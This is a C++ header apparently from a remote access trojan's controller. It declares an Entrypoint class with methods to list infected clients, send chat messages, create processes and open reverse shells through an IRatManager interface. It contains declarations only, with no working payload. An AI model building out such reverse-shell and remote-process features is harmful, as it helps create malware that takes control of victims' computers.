#pragma once

#include <map>
#include <memory>

#include "ICommunicationFactory.h"
#include "IRatManager.h"

enum CommandType {
	SendChatMessage,
	ListClients,
	Help
};

class Entrypoint
{
public:
	Entrypoint();

private:
	void Startup();

	void SendChatMessage();
	void SendCreateProcess();
	void SendReverseShell();
	void ListClients() const;

	void ParseInput();

	std::map<std::string, std::function<void()>> _commands;
	std::unique_ptr<ICommunicationFactory> _factory;
	std::unique_ptr<IRatManager> _manager;
	std::string _command;
	std::string _args;
};

